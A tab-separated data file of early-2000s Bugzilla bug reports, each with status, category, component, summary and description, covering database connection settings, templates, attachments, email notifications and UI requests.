98368%TAB%999672629%TAB%34907%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%The DBI connect in globals.pl does not use the db_port defined in localconfig%TAB%The DBI connect in globals.pl does not use the db_port defined in localconfigIn globals.pl, the DBI->connect does not use the db_port variable defined in localconfig.  Which seems strange to me since checksetup.pl does use it. A $::driver variable will need to be added when new databases are brought into the mix, such as Pg (PostgreSQL). It will need to be added to localconfig, checksetup.pl and globals.   $::driver = 'mysql';  $::db = DBI->connect("DBI:$::driver:host=$::db_host;database=$name;port=$::db_port", $::db_user, $::db_pass)  	    || die "Bugzilla is currently broken. Please try again later. " .         "If the problem persists, please contact " . Param("maintainer") .        ". The error you should quote is: " . $DBI::errstr;  Matthew Tuck [:CodeMachine]
98468%TAB%999717253%TAB%24475%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Administration%TAB%Sample value for emailregexp allows empty user names%TAB%Sample value for emailregexp allows empty user namesIn defparams.pl, the description of the emailregexp parameter is given as  follows: 'This defines the regexp to use for legal email addresses.  The default tries to  match fully qualified email addresses.  Another popular value to put here is  <tt>^[^@]*$</tt>, which means "local usernames, no @ allowed.'  If you use the given sample value for emailregexp, Bugzilla will accept an empty  string as a valid user name.  Also note the missing quote mark at the end of the string.  I recommend changing the description to: 'This defines the regexp to use for legal email addresses.  The default tries to  match fully qualified email addresses.  Another popular value to put here is  <tt>^[^@]+$</tt>, which means "local usernames, no @ allowed."'
98507%TAB%999755537%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Should  DBNameToIdAndCheck() do a PutFooter?%TAB%Should  DBNameToIdAndCheck() do a PutFooter?Currently, it doesn't do so on any error, it just does an exit(0);  Is there a reason why it doesn't?  (Or maybe it should use PuntTryAgain()?)
98601%TAB%999778755%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,attachment and request management%TAB%"create attachment" should allow you to comment on bug and obsolete old attachments,"create attachment" should allow you to comment on bug%TAB%"create attachment" should allow you to comment on bug and obsolete old attachments,"create attachment" should allow you to comment on bugWhen creating an attachment, it should be possible to also submit a comment to the bug about the attachment as well as mark previously submitted attachments as obsolete.  This would save users from having to take these common additional steps separately (which takes more time and generates more bug mail).
98602%TAB%999779247%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,attachment and request management%TAB%Templatize createattachment.cgi%TAB%Templatize createattachment.cgicreateattachment.cgi should be templatized as part of the overall effort to templatize the entire application, the tracking bug for which is bug 86168.  Probably the best way to do this is to incorporate attachment creation capabilities into attachment.cgi.  When doing this work, keep in mind the features requested in bugs 87420, 87770, 93749, 97768, and possibly 98096. bug 87420 - Pressing back on "create attachment". bug 87770 - createattachment should work with no parameters. bug 93749 - Bugzilla tells me to `Create an Attachment' when I already did bug 97768 - Create Attachment: MIME types for Microsoft Word, Excel, Powerpoint, etc. bug 98096 - Creating an attachment should give more information.
98658%TAB%999798497%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration,Installation%TAB%Let administrator know which customised templates have been updated by Bugzilla team.,Add version headers to all templates in preparation for later admin notification of template changes.%TAB%Let administrator know which customised templates have been updated by Bugzilla team.,Add version headers to all templates in preparation for later admin notification of template changes.If an administrator has a customised template in the custom directory, and the template in the default directory is modified by the Bugzilla team, we should notify the administrator.  The changes might be small, or they might cause incompatibility.  It might be required, possibly required or beneficial for the admin to update their custom template.  One implementation is for checksetup.pl to maintain a list of CRCs for all the templates and regenerate and check them each run.  This however would make it impossible to make changes that are "below-the-radar" such as license/comment changes, unless we added a preprocessing step to strip these out.  An alternative option is to store version numbers, but any system where these needed to be manually updated would be asking for trouble.
98744%TAB%999854806%TAB%35018%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Clicking "remove cc" checkbox, but not selecting user produces "Software Error"%TAB%Clicking "remove cc" checkbox, but not selecting user produces "Software Error"If a user, while modifying a bug selects the remove CC checkbox, but doesn't actually select any of the users, it blows up on process_bug.cgi, line 675:  672          $cc_add = $::FORM{newcc}; 673          # We came from bug_form which uses a select box to determine what cc's 674          # need to be removed... 675          if (defined $::FORM{removecc}) { 676              $cc_remove = join (",", @{$::MFORM{cc}}); 677          } 678      }   The error message is "Can't use an undefined value as an ARRAY reference at /home/bugzilla/process_bug.cgi line 675"
98751%TAB%999857090%TAB%35021%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%Ability to Edit Memorized Queries,"Update Remembered Query" option%TAB%Ability to Edit Memorized Queries,"Update Remembered Query" optionAs a new bugzilla user on a different project, I find it difficult to  get the "memorized queries" correct the first time.  It takes a while to establish a pattern of use, and figure out what makes a good query.  Over time, I've established conventions about the use of certain fields (Priority, CC, etc.) that make the previously memorized query no longer useful.    However, there's no way to update a memorized query once it's been created. There is an "edit this query" option, but it doesn't affect the memorized  queries.  The only solution is to memorize a new query based on the old  one, then delete the old one.  Annoying.    I'd like the ability to replace / update a memorized query. A good approach would be to add an option to the Memorized query box at the bottom of the screen, that allows a user to replace a memorized query with the current one.
98801%TAB%999873042%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,attachment and request management%TAB%request tracker%TAB%request trackerThe request tracker is a mechanism for requesting changes to data in Bugzilla from other users (f.e. flagging a patch with the "has-review" status) and tracking the status of those requests.  It comprises a form for making requests which is linked from the show bug and edit attachment screens, a mechanism for automatically fulfilling requests when a user of whom changes has been requested makes an update to the relevant bug/attachment, bug mail that gets sent whenever a request is submitted or fulfilled, and the ability to view the queue of pending requests in total or broken down by requestee.  The well-developed bug infrastructure will be used to support requests.  Although requests are entered and resolved in a streamlined way, internally a request will really be a bug filed on a specific product and component that has been designated to accept these requests.  This means that all the standard facilities for dealing with bugs (mail, comments, re-assignment, querying, etc.) will be available for requests.  The fundamental difference is that requests will be "filed" via a special form and "resolved" via updates to other bugs.  The request queue will be implemented as queries on the particular product(s) and component(s) that accept requests.  The request tracker was originally implemented as part of the patch tracker in bug 84338, but that architecture proved too limited.
98829%TAB%999888566%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Notes on technologies in HACKER'S GUIDE.%TAB%Notes on technologies in HACKER'S GUIDE.The hacker's guide should say that while Bugzilla uses Javascript to make the user experience easier, nothing should require it.  Similarly for cookies.  Anything else is a bug.
99024%TAB%1000060006%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup doesn't give template proper permissions.%TAB%checksetup doesn't give template proper permissions.checksetup.pl should make the template directory and its subdirectories have correct permissions.  Currently it doesn't, and I spent quite a while trying to work out why I couldn't emit templates.
99195%TAB%1000130100%TAB%12963%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Administration,Installation%TAB%Upgrade from 2.12 to 2.14 fails,checksetup.pl fails to connect when checking to see if database exists%TAB%Upgrade from 2.12 to 2.14 fails,checksetup.pl fails to connect when checking to see if database existsWhen upgrading from 2.12 to 2.14, I ran checksetup.pl.  The first time, I got a  message about the create_htaccess variable in localconfig.  I changed this value from 1 to 0 and re-ran checksetup.pl.  At this point I get the error: ---  Checking user setup ... DBI->connect(;ottawa;3306) failed: No Database Selected at ./checksetup.pl line 736 Uncaught exception from user code:         Can't connect to the mysql database. Is the database installed and up and running?  Do you have the correct username and password selected in localconfig? ---  The bugzilla database exists on ottawa.  There is a comment in the code about the original dsn:  # original DSN line was: #    my $dsn = "DBI:$db_base:$my_db_name;$my_db_host;$my_db_port"; # removed the $db_name because we don't know it exists yet, and this will fail # if we request it here and it doesn't. - justdave@syndicomm.com 2000/09/16   I added $my_db_name in front of $my_db_host and the problem went away.  I shouldn't have to edit this file.
99203%TAB%1000133042%TAB%1686%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%alias for a bug%TAB%alias for a bugNeed a way to address a bug using a string moniker. More specifically we'd like to be able to add an alias to the |Depends on|, and the |Blocks| list.
99205%TAB%1000133209%TAB%1686%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%query to meta bugs,enhance mass-editing of dependencies,Allow mass-editing of dependencies%TAB%query to meta bugs,enhance mass-editing of dependencies,Allow mass-editing of dependenciesNeed a way to group select a bunch of bugs and create a dependency (meta) bug from them. We probably need to extend this as a field in the options for mass changes.
99209%TAB%1000133440%TAB%1686%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%modify dependency tree bugs%TAB%modify dependency tree bugsNeed a way to bulk change the bugs under a dependency tree. Just like the way the query results page offers a way to make changes to several of those bugs, we'd like to be able to make changes to several bugs based on the dependency tree.
99215%TAB%1000134866%TAB%3881%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%attachment status changes have no midair collision protection,flag changes have no midair collision protection,Attachments have no midair collision protection%TAB%attachment status changes have no midair collision protection,flag changes have no midair collision protection,Attachments have no midair collision protection(I'm reporting this in whatever version of bugzilla http://bugzilla.mozilla.org/ runs as of 10 minutes ago.)  Changes to attachment status have no midair collision detection.  This causes problems like the one seen in http://bugzilla.mozilla.org/show_activity.cgi?id=93164 at 2001-09-10 17:02.  Steps to reproduce:  * Click the "Edit" link for one attachment in one browser  * do the same in another browser  * check "has review" in the first, and submit  * check "has super-review" in the second, and submit  Result:  * the attachment no longer has review  Expected result alternative #1:  * midair collision report  Expected result alternative #2:  * the attachment has both review and super-review  I prefer #1 because of the possibility of withdrawing review for a bug (or the possibility of one person marking an attachment obsolete as another is reviewing) -- if it were not possible to unset the states once they were set then #2 would be preferable.
99260%TAB%1000167250%TAB%33998%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Reporting/Charting%TAB%New charts and reports,New charts for week and month intervals%TAB%New charts and reports,New charts for week and month intervalsIn my Bugzilla installation, we needed charts and reports for weeks and months,  not only days, so I've changed the collectstats.pl and the reports.cgi to fit.  I will attach my files, so if please put your suggestions/comments/remarks on  it...
99465%TAB%1000359788%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%FreeBSD not recognized!%TAB%FreeBSD not recognized!Some fields initialized from your user-agent, Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:0.9.4+) Gecko/20010912. If you think it got it wrong, please tell endico@mozilla.org what it should have been.  Prefilled: Other/other.
99518%TAB%1000382670%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%template files do not have license headers%TAB%template files do not have license headersThe template files in the template/default sub-directory do not contain license headers even though they are licensed under the same terms (MPL) as the rest of the code in the Bugzilla distribution.  All of the following files should have MPL license headers:  attachment/   edit.atml   list.atml   updated.atml   viewall.atml  attachstatus/   create.atml   edit.atml   list.atml Comments in template files use the pound sign (#) within directive tags ([% %]), for example:  [% DIRECTIVE STATEMENT HERE # single line comment %] or...  [%# multi     line     comment %]  Multi-line comments occur when the pound sign appears just after the opening tag.
99519%TAB%1000383061%TAB%29363%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Invalid timestamp in cc, no e-mail%TAB%Invalid timestamp in cc, no e-mailWhen you add yourself only as cc to any bug, this activity is logged with bad timestamp (previous last activity timestamp is used intead of current time) and e-mail to particular persons is not sent.
99567%TAB%1000411855%TAB%35333%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Allow Milestone to be set on creation of bug as an option%TAB%Allow Milestone to be set on creation of bug as an optionWe use bugzilla to develop our apps where there is mainly just admin staff  submitting bugs not so much the users as with bugzilla.mozilla.org.  So the  person that is creating the bug needs to be able to set the Milestone as  well.  For the time being we are going back to the bug and setting it but it  would be nice if we could enable it as an option.  Something I'm sure you guys  would gladly do since this application goals seams to be to be as flexible as  possible which it does very well and this is the first time I have had an idea  how something could be done better.  
99595%TAB%1000438593%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Documentation%TAB%Win32 Install - Use full path to perl.%TAB%Win32 Install - Use full path to perl.Step 13 of the Win32 install instructions (win32.html) says to "Modify the invocation of all system() calls in all perl scripts in your Bugzilla directory. For instance, change this line in processmail" and then suggests adding "perl" in front of processmail.  The correct line should be:  system("C:\\perl\\bin\\perl", "processmail", @ARGLIST);  Notice that there is a full path to the perl .exe file and also that the system call avoids invocing a shell by not putting two paramaters in the same string.
99697%TAB%1000477445%TAB%35369%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Accounts%TAB%LDAP authentication does not check for emailregexp parameter.%TAB%LDAP authentication does not check for emailregexp parameter.When using LDAP Bugzilla silently copies LDAP accounts into profiles table without checking user emails againts email filter. On one server it is possible to host multiple email domains and right now there is no way to restrict which users can access Bugzilla.
99716%TAB%1000485983%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%cannot query for Attachment is obsolete AND Attachment Status%TAB%cannot query for Attachment is obsolete AND Attachment StatusA query in the boolean tool (advanced search) for Attachment is obsolete any value AND Attachment Status any value results in a Software error. 
99955%TAB%1000649977%TAB%32335%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%quicksearch does not have updated keyword list for JS,quicksearch does not have updated keyword, resolution, etc list for JS%TAB%quicksearch does not have updated keyword list for JS,quicksearch does not have updated keyword, resolution, etc list for JSWhen mozilla.org bug 89620 was fixed (removing the 'flash' keyword off the b.m.o install), the "quick search" did not know the keyword was gone.  Hence, if you currently search for any phrase involving flash, you will get an invalid keyword error.  The javascript used for the quicksearch should be tied into the keyword list.  We would either want to add it to localconfig.js or have a separate file for it.
100089%TAB%1000714143%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,Administration,Email Notifications%TAB%Remove old "template" parameters.,Templatise mail messages, including mail "template" parameters.,Templatise 'passwordmail' email%TAB%Remove old "template" parameters.,Templatise mail messages, including mail "template" parameters.,Templatise 'passwordmail' emailWe should aim to get rid of the "template" parameters now we have templates.  These include things like bannerhtml, footerhtml & newchangedmail.
100092%TAB%1000714412%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Template process failed error drops poop trail.,Template process failed error prints content-type to browser window.%TAB%Template process failed error drops poop trail.,Template process failed error prints content-type to browser window.When the template process fails on editattachstatuses.cgi (say because of bad permissions to the template), the content type gets written twice, and it appears once on the page as a result.
100094%TAB%1000714536%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%myk@mozilla.org,General template handling code.%TAB%myk@mozilla.org,General template handling code.We need to move some of Myk's template handling code from the attachment manager to CGI.pl, to reuse common code.
100100%TAB%1000715233%TAB%24900%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%Undefined value as ARRAY reference in enter_bug.cgi ,Undefined value as ARRAY reference in enter_bug.cgi%TAB%Undefined value as ARRAY reference in enter_bug.cgi ,Undefined value as ARRAY reference in enter_bug.cgiIt is possible, if the product is not defined, to get an error:    Undefined value as ARRAY reference in enter_bug.cgi line 244  This can occur if you are not logged into Bugzilla, and attempt to enter a new bug.  Once logged in, and redirected to the enter_bug.cgi script, the product information is not present.  The check is for @{$::components{$product}} and if the product is invalid, then the entry in the components array will be undefined, and you are attempting to use the undefined value as an array reference.
100137%TAB%1000723149%TAB%9991%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla: Other moz.org Issues,Administration%TAB%quip on bug list should not be a link to buglist.cgi,quip on buglist.cgi should not be a link to quips.cgi,param to disable adding new quips%TAB%quip on bug list should not be a link to buglist.cgi,quip on buglist.cgi should not be a link to quips.cgi,param to disable adding new quipsThe ability to add new quips to mozilla.org's bugzilla has been desabled for quite some time. According to Dawn Endico in bug 100104  > This is on purpose. The a large percentage of quips added were > inappropriate and had to be deleted. Maintaining the quips list > is simply more trouble than its worth.  If bug 100104 is WONTFIX then clicking on a quip should not lead to a page that prompts users to add their own quips.  have a look at http://lxr.mozilla.org/mozilla/source/webtools/bugzilla/buglist.cgi#1343  That line currently reads:    print "<HR><A HREF=quips.cgi><I>$quip</I></A></CENTER>\n";  In mozilla.org's installation, it should be changed to:    print "<HR><I>$quip</I></CENTER>\n";
100259%TAB%1000767859%TAB%35629%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading,Documentation%TAB%checksetup.pl fails during creation of tables,known install issues: DBD::Sponge::db prepare failed: Cannot determine NUM_OF_FIELDS%TAB%checksetup.pl fails during creation of tables,known install issues: DBD::Sponge::db prepare failed: Cannot determine NUM_OF_FIELDSHad to change sponge.pm (/Perl/site/lib/DBD), line 63 and line 64 from  	} elsif ($attribs->{'NAME'}) { 	    $numFields = @{$attribs->{NAME}};  to  	} elsif ($attribs->{'NAMES'}) { 	    $numFields = @{$attribs->{NAMES}};   Using following versions:  Checking perl modules ... Checking for             DBI (v1.13)   ok: found v1.14 Checking for    Data::Dumper (any)     ok: found v2.102 Checking for      DBD::mysql (v1.2209) ok: found v2.0400 Checking for     Date::Parse (any)     ok: found v2.20 Checking for       CGI::Carp (any)     ok: found v1.20  The following Perl modules are optional: Checking for              GD (v1.19)   ok: found v1.27 Checking for     Chart::Base (v0.99)   ok: found v0.99 Checking for     XML::Parser (any)     ok: found v2.27  Error shown:  DBD::Sponge::db prepare failed: Cannot determine NUM_OF_FIELDS at D:/Perl/site/l ib/DBD/mysql.pm line 248. SV = NULL(0x0) at 0x20fc444   REFCNT = 1   FLAGS = (PADBUSY,PADMY) Use of uninitialized value in subroutine entry at D:/Perl/site/lib/DBD/mysql.pm         line 250 (#1)     (W uninitialized) An undefined value was used as if it were already     defined.  It was interpreted as a "" or a 0, but maybe it was a mistake.     To suppress this warning assign a defined value to your variables.      To help you figure out what was undefined, perl tells you what operation     you used the undefined value in.  Note, however, that perl optimizes your     program and the operation displayed in the warning may not necessarily     appear literally in your program.  For example, "that $foo" is     usually optimized into "that " . $foo, and the warning will refer to     the concatenation (.) operator, even though there is no . in your     program.  Uncaught exception from user code:         Invalid DBI handle  at D:/Perl/site/lib/DBD/mysql.pm line 250.         DBD::mysql::db::table_info('DBI::db=HASH(0x1e3dbf0)') called at D:/Perl/ site/lib/DBI.pm line 1016         DBD::_::db::tables('DBI::db=HASH(0x1e3dbf0)') called at C:\bugzilla\sour ce\checksetup.pl line 1137  Thanks to psycko-hacker Harald Bakken for great help!
100490%TAB%1000855474%TAB%33168%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Browser-General,Bugzilla-General,Query/Bug List%TAB%[Bugzilla] bug ID used over search term if javascript disabled. Incorrect error message%TAB%[Bugzilla] bug ID used over search term if javascript disabled. Incorrect error messageFrom Bugzilla Helper: User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:0.9.4) Gecko/20010913 BuildID:    2001091303  NOTE: I was not able to fill a bug for Bugzilla so I've put that one in Browser-General even if it's not its place.  I've already filed bugs for Bugzilla, so I guess it is another bug to fill :)  PLEASE MOVE THIS BUG TO THE RIGHT PRODUCT.   Bugzilla requires javascript to make its queries If Javascript is disabled, if someone uses the search shortcut on Bugzilla's main page, Bugzilla will use the entered keywords as IDs not as search terms. Thus it will display an error message saying that the error number is incorrect.  It should in fact detect that the search terms were not IDs and that javascript must be enabled.   Reproducible: Always Steps to Reproduce: 1. Start Mozilla without javascript (I guess it does the same with IE) 2. Go to the web page, enter some keywords in the textbox (e.g. 'Bugzilla search') and press enter 3. Bugzilla will display an error message saying that bug number is invalid. 4. enable javascript 5. back 6. press enter again. Same error (possible other bug? - see additional information) 7. back 8. press enter again. javascript is taken into account and search terms are detected.  Actual Results:  The error message display that the bug ID is invalid. The message is inexplicit.  Expected Results:  The error message contains a message saying that javascript must be turned on.  There may be another bug hiden: the fact that going back after having enabled javascript the first time doesn't work. But I am not sure.
100639%TAB%1000904046%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%make resolution more visible on mostfreq list%TAB%make resolution more visible on mostfreq listAt http://bugzilla.mozilla.org/duplicates.cgi, the only indication that a bug  is resolved is that the bug number is crossed out.  This makes it hard to  quickly scan the list for only open bugs.  Suggested fix: show the resolution of closed bugs in the target milestone  column ("FIXED" for fixed bugs, "INVALID" for invalid bugs, etc).  So the list  might look like:  . . .  mozilla0.9.6  summary . . .    INVALID     summary . . .      ---       summary . . .   mozilla1.0   summary . . .     Future     summary . . .     FIXED      summary
100788%TAB%1000979439%TAB%17444%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Bugzilla Helper,Creating/Changing Bugs%TAB%Bugzilla helper incorrectly prepends http:// to non-http: URLs%TAB%Bugzilla helper incorrectly prepends http:// to non-http: URLsEnter a non-http URL like https://sourceforge.net or ftp://ftp.kde.org in bugzilla helper, fill in reqd fields, then click "open bugzilla entry form". http:// will be incorrectly added to the start of the URL.
100953%TAB%1001052601%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%UI for data/mail.,UI for data/nomail.,Move data/nomail into the DB and implement a UI to edit it%TAB%UI for data/mail.,UI for data/nomail.,Move data/nomail into the DB and implement a UI to edit itWe should have a UI for data/nomail.  This would basically be adding and deleting from a list of things, therefore it could share code with bug #95684.
101056%TAB%1001085794%TAB%12352%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%Edit attachment and login page don't work well together...,Edit attachment and login page don't work well together [dataloss]%TAB%Edit attachment and login page don't work well together...,Edit attachment and login page don't work well together [dataloss]If you haven't logged in to bugzilla and you go and edit an attachment and click submit, bugzilla takes you to the login page and once you've logged in bugzilla says that "One or more of the statuses changed are invalid", or something like that. If you click back in the browser and go to the edit attachement page again and click submit again everything work fine...
101166%TAB%1001190049%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%users seeing a bug via *_accessible bits should see group names%TAB%users seeing a bug via *_accessible bits should see group namesCurrently if a user isn't in a group for the bug, but is on the cc list, they see the text: "But users in the roles selected below can always view this bug:" without anything before it. If they are in one group, but not the one the bug is restricted to, then it looks just like an unrestricted bug.  Instead, they should see either just the group name, or a disabled checkbox field. (There is code in process_bug.cgi to stop users adding/removing a bug from groups that they aren't in)  As well, we should consider only allowing the _accessible bits to be changed by someone who is in all the groups in the bug's groupset. If we do this, then the ui should be modified to only list those bits which are on, or just have disabled checkboxes which are checked/unchecked as appropriate. The backend would also have to be changed.
101179%TAB%1001207762%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Customised statuses.,Customised statuses and workflow%TAB%Customised statuses.,Customised statuses and workflowe need to customise statuses.  This will get rid of an enumeration, but also allow status renaming of statuses, setting of permissions on transitions, and arbitrary graphs of statuses.  This is what I currently think:  statuses table:  name description {open, nonopen} {confirmed, unconfirmed, maybeconfirmed}  statustransitions table:  +-------------+--------------+--------------------------------+ | state_now   | avail_states | privs_required                 | +-------------+--------------+--------------------------------+ | (null)      | UNCONFIRMED  | (null)                         | | (null)      | NEW          | (canconfirm|editbugs)          | | UNCONFIRMED | NEW          | (canconfirm|editbugs|owner|qa) |           | UNCONFIRMED | ASSIGNED     | (editbugs|owner|qa)            | | UNCONFIRMED | ACCEPTED     | (editbugs|owner)               | | UNCONFIRMED | RESOLVED     | (editbugs|owner|qa|reporter)   | | NEW         | ASSIGNED     | (editbugs|owner|qa)            | | NEW         | ACCEPTED     | (editbugs|owner)               | | NEW         | RESOLVED     | (editbugs|owner|qa|reporter)   | | ASSIGNED    | NEW          | (editbugs|owner|qa)            | | ASSIGNED    | ACCEPTED     | (editbugs|owner)               | | ASSIGNED    | RESOLVED     | (editbugs|owner|qa|reporter)   | | ACCEPTED    | NEW          | (editbugs|owner|qa)            | | ACCEPTED    | RESOLVED     | (editbugs|owner|qa|reporter)   | | RESOLVED    | REOPENED     | (editbugs|owner|qa|reporter)   | | RESOLVED    | VERIFIED     | (editbugs|qa|reporter)         | | RESOLVED    | CLOSED       | (editbugs|owner|qa)            | | REOPENED    | ASSIGNED     | (editbugs|owner|qa)            | | REOPENED    | ACCEPTED     | (editbugs|owner)               | | REOPENED    | RESOLVED     | (editbugs|owner|qa|reporter)   | | VERIFIED    | REOPENED     | (editbugs|owner|qa|reporter)   | | VERIFIED    | CLOSED       | (editbugs|owner|qa)            | +-------------+--------------+--------------------------------+  I ripped this from the old bug, it is not entirely correct, a RESOLVED -> UNCONFIRMED transition is not present for example.  We need to automatically generate the actions from here, including:  Whether the bug gets confirmed by the transition, whether the resolution needs to be cleared or asked, etc.  We need to handle automatic transitions somehow.  These include popular vote (either put one status on the status table for each unconfirmed open status or have a special transition).  Also, automatic sleep/wakeups like ASLEEP (bug #8527) and REMIND (bug #65402) could hopefully be in this scheme.  We need to know when it can be put to sleep manually, when it should occur automatically, when it should wake up automatically and when it should be able to be woken up manually.  We could do various sanity checks on transitions:  - Prevent automatic transitions from going to open to non-open and vice versa, and similar sanity checks. - Prevent going to unconfirmed except from other unconfirmed.
101380%TAB%1001322354%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Newlines are getting into summaries,Newlines, nulls, leading/trailing spaces are getting into summaries%TAB%Newlines are getting into summaries,Newlines, nulls, leading/trailing spaces are getting into summariesWhen bug 101361 somehow a newline got embeded at the end of the summary (Stephen, any idea how this happened? What browser were you using?)  This caused the X-Bugzilla-Reason header to appear in the body.  Also, when I went to change the bug, it said that I changed the summary, even though I never touched that field (View Source on the Bug Activity page revealed that I removed the newline).  We need to strip newlines in the summary (as well as any other one line text fields) before we dump it to the database in post_bug.cgi.
101515%TAB%1001390875%TAB%35656%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%page footer's 'find' should allow searching,QuickSearch: page footer's 'find' should allow searching%TAB%page footer's 'find' should allow searching,QuickSearch: page footer's 'find' should allow searchingwhen you go to http://bugzilla.mozilla.org/, you are allowed to enter both search terms and a bug ID in the text-box.  This should be implemented for the page-footer in bugzilla as well. now all you can do is write a bug ID. if you try to type any text or anything else than numbers, it gives you "Error: The bug number is invalid".
101560%TAB%1001406933%TAB%36070%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Email Notifications%TAB%processmail doesn't work with the P4DTI%TAB%processmail doesn't work with the P4DTIBACKGROUND  The Perforce Defect Tracking Integration <http://www.ravenbrook.com/project/ p4dti/> integrates Bugzilla with the Perforce software configuration management  system.  It replicates bugs between Bugzilla and Perforce so that users of  Perforce can see and edit their bugs, and relate bugs to source changes.  When someone changes a bug in Perforce, the P4DTI updates the bug in Bugzilla.   It then needs to send e-mail notifications, which it does by running the Bugzilla  processmail script.  DEFECT DESCRIPTION  When the P4DTI runs the processmail script from Bugzilla 2.14, no e-mail is sent.   Instead, the following error message appears in the standard error:  Insecure $ENV{BASH_ENV} while running with -T switch at ./processmail line 745 \ (#1)      (F) You can't use system(), exec(), or a piped open in a setuid or     setgid script if any of $ENV{PATH}, $ENV{IFS}, $ENV{CDPATH},     $ENV{ENV} or $ENV{BASH_ENV} are derived from data supplied (or     potentially supplied) by the user.  The script must set the path to a     known value, using trustworthy data.  See perlsec.  REPRODUCING THIS BUG  You probably don't want to install the P4DTI in order to confirm this bug.   Instead, run Bugzilla in an environment where some of the dangerous environment  variable have values.  You'll see that processmail doesn't send e-mail.  DIAGNOSIS  The processmail script is invoking the shell in order to open a pipe to sendmail.   It does so with taint mode turned on (-T option to perl) but without clearing the  dangerous environment variables.  SOLUTION  Clear the dangerous environment variables, as recommended in the perlsec manpage,  by running        delete @ENV{qw(IFS CDPATH ENV BASH_ENV)};  before invoking the shell.  I added this line to my processmail script and the P4DTI was then able to send e- mail notifications.  OTHER NOTES  Why doesn't this bug show up in normal operation?  Perhaps because Bugzilla  always runs in an environment where the dangerous environment variables aren't  set (e.g., in Apache under user "nobody").  This is related to bug 59349.
101659%TAB%1001433918%TAB%36112%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%emailsuffix missing from component owner mailto tag%TAB%emailsuffix missing from component owner mailto tagThe "mailto" tag for the owner of each component in the component description list is missing the "emailsuffix" parameter. My fix:  describecomponents.cgi ----------------------  106a107 > my $emailsuffix = Param("emailsuffix"); 134c135 < <td><a href="mailto:$initialowner">$initialowner</a></td> --- > <td><a href="mailto:$initialowner$emailsuffix">$initialowner</a></td> 138c139 < <td><a href="mailto:$initialqacontact">$initialqacontact</a></td> --- > <td><a href="mailto:$initialqacontact$emailsuffix">$initialqacontact</a></td>
101770%TAB%1001496183%TAB%18780%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs,attachment and request management%TAB%attachment comment formatting problems,comment box on the edit attachment page should be bigger,Comment box on the edit attachment page is too small%TAB%attachment comment formatting problems,comment box on the edit attachment page should be bigger,Comment box on the edit attachment page is too smallThe recent feature of being able to edit attachments is great! Some problems though: (1) the comment field is too small. Couldn't the page layout be a bit different so it could be larger? Perhaps the same width as the attachment text but right below it? (2) when text is copied from the attachment comment field, it's not wrapped. It gets written onto the bug as one long line.
